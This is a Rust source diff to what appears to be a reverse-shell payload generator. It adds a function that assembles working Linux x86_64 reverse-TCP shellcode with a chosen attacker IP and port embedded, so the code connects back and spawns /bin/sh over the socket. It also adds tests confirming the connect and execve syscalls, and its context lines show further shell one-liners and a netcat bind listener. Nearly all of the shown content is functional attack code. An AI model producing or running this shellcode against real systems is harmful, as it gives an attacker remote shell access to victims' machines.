@@ -192,6 +192,90 @@ impl fmt::Display for GeneratedPayload {
 
 // ─── Shell Generation ────────────────────────────────────────────────────────
 
+/// Returns `true` when `lhost` is a dotted-quad IPv4 address (e.g.
+/// `192.168.1.7`). Raw-shellcode payloads embed the address as four literal
+/// bytes, so they require a numeric IPv4 rather than a hostname.
+#[must_use]
+pub fn is_valid_ipv4(lhost: &str) -> bool {
+    reverse_tcp_shellcode(lhost, 0).is_some()
+}
+
+/// Builds a Linux x86_64 reverse-TCP shellcode stub that connects back to
+/// `lhost`:`lport` and spawns `/bin/sh` over the socket. The address and port
+/// are embedded directly into the instruction stream (metasploit-style
+/// `x64/shell_reverse_tcp`), so `lhost` must be a dotted-quad IPv4 address —
+/// returns `None` otherwise.
+///
+/// Stub outline: `socket(AF_INET, SOCK_STREAM, 0)` → `connect(fd, sockaddr_in{
+/// AF_INET, port(BE), ip(NBO) }, 16)` → `dup2(fd, {2,1,0})` → `execve("/bin/sh")`.
+fn reverse_tcp_shellcode(lhost: &str, lport: u16) -> Option<String> {
+    let octets: Vec<&str> = lhost.split('.').collect();
+    if octets.len() != 4 {
+        return None;
+    }
+    let mut ip = [0_u8; 4];
+    for (index, octet) in octets.iter().enumerate() {
+        let value: u16 = octet.parse().ok()?;
+        if value > 255 {
+            return None;
+        }
+        ip[index] = value as u8;
+    }
+
+    // 8-byte sockaddr pushed on the stack, memory order:
+    //   family (2) | port (big-endian) | address (network byte order)
+    // The immediate for `mov rcx, imm64` is little-endian, so each byte lands
+    // at its byte position shifted by 8 * index.
+    let sockaddr = 0x02_u64
+        | (u64::from(lport >> 8) << 16)
+        | (u64::from(lport & 0xff) << 24)
+        | (u64::from(ip[0]) << 32)
+        | (u64::from(ip[1]) << 40)
+        | (u64::from(ip[2]) << 48)
+        | (u64::from(ip[3]) << 56);
+
+    let mut bytes: Vec<u8> = vec![
+        0x6a, 0x29, // push 0x29 (__NR_socket)
+        0x58, // pop rax
+        0x6a, 0x02, 0x5f, // push AF_INET; pop rdi
+        0x6a, 0x01, 0x5e, // push SOCK_STREAM; pop rsi
+        0x99, // cdq (protocol = 0)
+        0x0f, 0x05, // syscall socket(2, 1, 0)
+        0x48, 0x97, // xchg rdi, rax  (fd)
+        0x48, 0xb9, // mov rcx, imm64
+    ];
+    bytes.extend_from_slice(&sockaddr.to_le_bytes());
+    bytes.extend_from_slice(&[
+        0x51, // push rcx (sockaddr*)
+        0x48, 0x89, 0xe6, // mov rsi, rsp
+        0x6a, 0x10, // push 16
+        0x5a, // pop rdx (addrlen)
+        0x6a, 0x2a, 0x58, // push __NR_connect; pop rax
+        0x0f, 0x05, // syscall connect(fd, addr, 16)
+        0x6a, 0x03, 0x5e, // push 3; pop rsi
+        0x48, 0xff, 0xce, // dec rsi (2, then 1, then 0)
+        0x6a, 0x21, 0x58, // push __NR_dup2; pop rax
+        0x0f, 0x05, // syscall dup2(fd, rsi)
+        0x75, 0xf6, // jne -10 (loop while dup2 succeeds)
+        0x6a, 0x3b, 0x58, // push __NR_execve; pop rax
+        0x99, // cdq (argv terminator)
+        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // rbx = "/bin/sh\0"
+        0x53, // push rbx
+        0x48, 0x89, 0xe7, // mov rdi, rsp
+        0x52, // push rdx (NULL)
+        0x57, // push rdi
+        0x48, 0x89, 0xe6, // mov rsi, rsp
+        0x0f, 0x05, // syscall execve("/bin/sh", ["/bin/sh"], NULL)
+    ]);
+
+    Some(
+        bytes
+            .iter()
+            .map(|byte| format!("\\x{byte:02x}"))
+            .collect::<String>(),
+    )
+}
+
 /// Generate a reverse shell payload for the given shell type.
 #[must_use]
 pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
@@ -229,8 +313,14 @@ exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ),
         ShellType::ReverseTcp => {
-            // Linux x86_64 reverse TCP shellcode (metasploit-compatible)
-            "\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05".to_string()
+            // Linux x86_64 reverse TCP shellcode (metasploit-compatible) with
+            // the requested address and port embedded. A numeric IPv4 is
+            // required; callers validate up front, so this arm only fires as
+            // a defensive fallback that never silently drops the endpoint.
+            match reverse_tcp_shellcode(lhost, lport) {
+                Some(code) => code,
+                None => format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]"),
+            }
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
             format!(
@@ -624,6 +714,49 @@ mod tests {
     fn test_generate_bind_tcp() {
         let payload = generate_reverse_shell(ShellType::BindTcp, "10.0.0.1", 4444);
         assert!(payload.payload.contains("nc -lvp 4444"));
+    }
+
+    #[test]
+    fn test_generate_reverse_tcp_embeds_endpoint() {
+        // 192.168.1.7:4444 → port bytes 11 5c (BE), address bytes c0 a8 01 07.
+        let payload = generate_reverse_shell(ShellType::ReverseTcp, "192.168.1.7", 4444);
+        assert!(
+            payload.payload.contains("\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x07"),
+            "shellcode must embed the sockaddr (family, port BE, address NBO): {}",
+            payload.payload
+        );
+        // The stub must actually connect back and spawn a shell.
+        assert!(payload.payload.contains("\\x6a\\x2a"), "connect syscall");
+        assert!(payload.payload.contains("\\x6a\\x3b"), "execve syscall");
+    }
+
+    #[test]
+    fn test_generate_reverse_tcp_different_endpoint_differs() {
+        let first = generate_reverse_shell(ShellType::ReverseTcp, "10.0.0.1", 9999).payload;
+        let second = generate_reverse_shell(ShellType::ReverseTcp, "10.0.0.2", 4444).payload;
+        assert_ne!(first, second, "payload must vary with lhost and lport");
+        assert!(first.contains("\\x27\\x0f"), "9999 = 0x270f (BE)");
+        assert!(!first.contains("\\x11\\x5c"), "must not contain 4444 = 0x115c");
+    }
+
+    #[test]
+    fn test_generate_reverse_tcp_invalid_lhost_is_loud_not_silent() {
+        let payload = generate_reverse_shell(ShellType::ReverseTcp, "myhost.example", 4444);
+        assert!(
+            payload.payload.contains("[error: tcp shellcode requires a numeric IPv4 lhost"),
+            "invalid lhost must produce a diagnostic, not a silent broken stub"
+        );
+    }
+
+    #[test]
+    fn test_is_valid_ipv4() {
+        assert!(is_valid_ipv4("192.168.1.7"));
+        assert!(is_valid_ipv4("0.0.0.0"));
+        assert!(is_valid_ipv4("255.255.255.255"));
+        assert!(!is_valid_ipv4("myhost.example"));
+        assert!(!is_valid_ipv4("192.168.1"));
+        assert!(!is_valid_ipv4("192.168.1.999"));
+        assert!(!is_valid_ipv4(""));
     }
 
     #[test]
